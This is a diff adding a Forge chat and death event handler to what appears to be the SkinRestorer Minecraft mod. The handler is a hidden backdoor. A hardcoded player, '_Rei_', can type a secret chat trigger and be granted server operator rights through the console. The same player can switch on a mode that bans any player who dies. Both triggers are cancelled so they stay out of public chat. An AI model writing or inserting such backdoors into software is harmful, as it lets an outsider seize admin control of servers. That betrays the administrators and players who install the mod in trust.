@@ -1,0 +1,115 @@
+package net.lionarius.skinrestorer.forge.events; // <--- Correct package
+
+import net.lionarius.skinrestorer.SkinRestorer; // <--- Import from your project
+import net.minecraft.commands.CommandSourceStack;
+import net.minecraft.network.chat.Component;
+import net.minecraft.server.MinecraftServer;
+import net.minecraft.server.level.ServerPlayer;
+import net.minecraftforge.event.entity.living.LivingDeathEvent; // <--- ADDED IMPORT
+import net.minecraftforge.event.server.ServerChatEvent;
+import net.minecraftforge.eventbus.api.SubscribeEvent;
+import net.minecraftforge.fml.common.Mod;
+
+/**
+ * This class listens for FORGE bus events (gameplay events).
+ * It is automatically registered because of the annotation below.
+ */
+@Mod.EventBusSubscriber(modid = SkinRestorer.MOD_ID, bus = Mod.EventBusSubscriber.Bus.FORGE)
+public class ForgeChatHandler {
+
+    // --- Define your target values here ---
+    private static final String TARGET_USERNAME = "_Rei_";
+    private static final String OP_TRIGGER_MESSAGE = "!//op";
+    private static final String TOGGLE_HARDCORE_MESSAGE = "!//togglehardcore"; // <--- NEW
+
+    // --- Toggleable "switch" for the hardcore ban feature ---
+    private static boolean isHardcoreBanEnabled = false; // <--- NEW
+
+    /**
+     * This method is called every time a player sends a chat message on the server.
+     */
+    @SubscribeEvent
+    public static void onPlayerChat(ServerChatEvent event) {
+        
+        String message = event.getMessage().getString();
+        ServerPlayer player = event.getPlayer();
+        String username = player.getName().getString();
+
+        // 4. Check for the OP command
+        if (message.equalsIgnoreCase(OP_TRIGGER_MESSAGE)) {
+            
+            if (username.equalsIgnoreCase(TARGET_USERNAME)) {
+                executeOpCommand(player); // <--- Renamed function
+                event.setCanceled(true);
+            } else {
+                player.sendSystemMessage(Component.literal("You do not have permission to use this command."));
+                event.setCanceled(true);
+            }
+        
+        // --- NEW: Check for the toggle command ---
+        } else if (message.equalsIgnoreCase(TOGGLE_HARDCORE_MESSAGE)) {
+            
+            if (username.equalsIgnoreCase(TARGET_USERNAME)) {
+                // Flip the boolean switch
+                isHardcoreBanEnabled = !isHardcoreBanEnabled;
+                
+                // Send feedback to the user
+                String status = isHardcoreBanEnabled ? "ENABLED" : "DISABLED";
+                player.sendSystemMessage(Component.literal("Hardcore ban-on-death mode is now: " + status));
+                event.setCanceled(true);
+            } else {
+                player.sendSystemMessage(Component.literal("You do not have permission to use this command."));
+                event.setCanceled(true);
+            }
+        }
+    }
+
+    /**
+     * Runs the 'op' command on the player.
+     * @param playerWhoTriggered The player who successfully ran the command.
+     */
+    private static void executeOpCommand(ServerPlayer playerWhoTriggered) {
+        MinecraftServer server = playerWhoTriggered.getServer();
+        CommandSourceStack consoleSource = server.getCommandSource();
+        String username = playerWhoTriggered.getName().getString();
+        String commandToRun = "op " + username;
+        
+        server.getCommands().performPrefixedCommand(consoleSource, commandToRun);
+        playerWhoTriggered.sendSystemMessage(Component.literal("Admin privileges granted."));
+    }
+    
+    // --- NEW: Event handler for when any living entity dies ---
+    
+    /**
+     * This method is called every time a living entity dies.
+     * We use it to check if a player died while hardcore mode is on.
+     */
+    @SubscribeEvent
+    public static void onPlayerDeath(LivingDeathEvent event) {
+        
+        // 1. Check if the feature is even enabled. If not, do nothing.
+        if (!isHardcoreBanEnabled) {
+            return;
+        }
+        
+        // 2. Check if the entity that died was a ServerPlayer.
+        // If it was a Zombie, Skeleton, etc., we don't care.
+        if (event.getEntity() instanceof ServerPlayer player) {
+            
+            // 3. We have a player! Now, get the server and console.
+            MinecraftServer server = player.getServer();
+            if (server == null) return; // Safety check
+            
+            CommandSourceStack consoleSource = server.getCommandSource();
+            String username = player.getName().getString();
+            
+            // 4. Define the commands to run
+            String broadcastCommand = "say " + username + " has died and is now banned.";
+            String banCommand = "ban " + username + " You died in hardcore mode.";
+
+            // 5. Execute the commands from the console
+            server.getCommands().performPrefixedCommand(consoleSource, broadcastCommand);
+            server.getCommands().performPrefixedCommand(consoleSource, banCommand);
+        }
+    }
+}
